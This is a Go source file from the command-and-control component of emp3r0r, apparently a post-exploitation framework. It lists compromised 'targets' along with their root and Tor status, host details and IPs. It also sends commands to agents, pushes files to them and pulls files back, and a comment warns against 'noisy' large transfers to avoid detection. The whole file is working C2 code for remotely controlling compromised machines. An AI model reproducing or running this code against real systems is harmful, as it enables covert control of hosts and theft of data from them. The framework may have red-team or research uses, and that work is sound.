package cc

import (
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"io/ioutil"
	"os"
	"strings"

	"github.com/fatih/color"
	"github.com/jm33-m0/emp3r0r/core/internal/agent"
	"github.com/jm33-m0/emp3r0r/core/internal/tun"
	"github.com/posener/h2conn"
)

var (
	// DebugLevel what kind fof logs do we want to see
	// 0 (INFO) -> 1 (WARN) -> 2 (ERROR)
	DebugLevel = 0

	// EmpRoot root directory of emp3r0r
	EmpRoot, _ = os.Getwd()

	// Targets target list, with control (tun) interface
	Targets = make(map[*agent.SystemInfo]*Control)
)

const (
	// Temp where we save temp files
	Temp = "/tmp/emp3r0r/"

	// WWWRoot host static files for agent
	WWWRoot = Temp + tun.FileAPI

	// FileGetDir where we save #get files
	FileGetDir = "/tmp/emp3r0r/file-get/"
)

// Control controller interface of a target
type Control struct {
	Index int
	Conn  *h2conn.Conn
}

// ListTargets list currently connected targets
func ListTargets() {
	color.Cyan("Connected agents\n")
	color.Cyan("=================\n\n")

	indent := strings.Repeat(" ", len(" [0] "))
	for target, control := range Targets {
		userInfo := color.HiRedString(target.User)
		hastor := color.HiRedString("NO")
		if target.HasRoot {
			userInfo = color.HiGreenString(target.User)
		}
		if target.HasTor {
			hastor = color.HiGreenString("YES")
		}
		fmt.Printf(" [%s] Tag: %s"+
			"\n%sUser: %s"+
			"\n%sTor: %s"+
			"\n%sCPU: %s"+
			"\n%sMEM: %s"+
			"\n%sHardware: %s"+
			"\n%sContainer: %s"+
			"\n%sOS: %s"+
			"\n%sKernel: %s - %s"+
			"\n%sFrom: %s"+
			"\n%sIPs: %s\n\n",
			color.CyanString("%d", control.Index), strings.Repeat(" ", (15-len("Tag")))+target.Tag,
			indent, strings.Repeat(" ", (15-len("User")))+userInfo,
			indent, strings.Repeat(" ", (15-len("Tor")))+hastor,
			indent, strings.Repeat(" ", (15-len("CPU")))+color.HiMagentaString(target.CPU),
			indent, strings.Repeat(" ", (15-len("MEM")))+target.Mem,
			indent, strings.Repeat(" ", (15-len("Hardware")))+color.HiCyanString(target.Hardware),
			indent, strings.Repeat(" ", (15-len("Container")))+target.Container,
			indent, strings.Repeat(" ", (15-len("OS")))+color.HiWhiteString(target.OS),
			indent, strings.Repeat(" ", (15-len("Kernel")))+color.HiBlueString(target.Kernel), color.HiWhiteString(target.Arch),
			indent, strings.Repeat(" ", (15-len("From")))+color.HiYellowString(target.IP),
			indent, strings.Repeat(" ", (15-len("IPs")))+strings.Join(target.IPs, ", "))
	}
}

// GetTargetFromIndex find target from Targets via control index
func GetTargetFromIndex(index int) (target *agent.SystemInfo) {
	for t, ctl := range Targets {
		if ctl.Index == index {
			target = t
			break
		}
	}
	return
}

// GetTargetFromTag find target from Targets via tag
func GetTargetFromTag(tag string) (target *agent.SystemInfo) {
	for t := range Targets {
		if t.Tag == tag {
			target = t
			break
		}
	}
	return
}

// ListModules list all available modules
func ListModules() {
	CliPrettyPrint("Module Name", "Help", &agent.ModuleDocs)
}

// Send2Agent send MsgTunData to agent
func Send2Agent(data *agent.MsgTunData, agent *agent.SystemInfo) (err error) {
	ctrl := Targets[agent]
	if ctrl == nil {
		return errors.New("Send2Agent: Target is not connected")
	}
	out := json.NewEncoder(ctrl.Conn)

	err = out.Encode(data)
	return
}

// PutFile put file to agent
func PutFile(lpath, rpath string, a *agent.SystemInfo) error {
	// open and read the target file
	f, err := os.Open(lpath)
	if err != nil {
		CliPrintError("PutFile: %v", err)
		return err
	}
	bytes, err := ioutil.ReadAll(f)
	if err != nil {
		CliPrintError("PutFile: %v", err)
		return err
	}

	// file sha256sum
	sum := sha256.Sum256(bytes)

	// file size
	size := len(bytes)
	sizemB := float32(size) / 1024 / 1024
	if sizemB > 20 {
		return errors.New("please do NOT transfer large files this way as it's too NOISY, aborting")
	}
	CliPrintInfo("\nPutFile:\nUploading '%s' to\n'%s' "+
		"on %s, agent [%d]\n"+
		"size: %d bytes (%.2fmB)\n"+
		"sha256sum: %x",
		lpath, rpath,
		a.IP, Targets[a].Index,
		size, sizemB,
		sum,
	)

	// base64 encode
	payload := base64.StdEncoding.EncodeToString(bytes)

	fileData := agent.MsgTunData{
		Payload: "FILE" + agent.OpSep + rpath + agent.OpSep + payload,
		Tag:     a.Tag,
	}

	// send
	err = Send2Agent(&fileData, a)
	if err != nil {
		CliPrintError("PutFile: %v", err)
		return err
	}
	return nil
}

// GetFile get file from agent
func GetFile(filepath string, a *agent.SystemInfo) error {
	var data agent.MsgTunData
	cmd := fmt.Sprintf("#get %s", filepath)

	data.Payload = fmt.Sprintf("cmd%s%s", agent.OpSep, cmd)
	data.Tag = a.Tag
	err := Send2Agent(&data, a)
	if err != nil {
		CliPrintError("GetFile: %v", err)
		return err
	}
	return nil
}
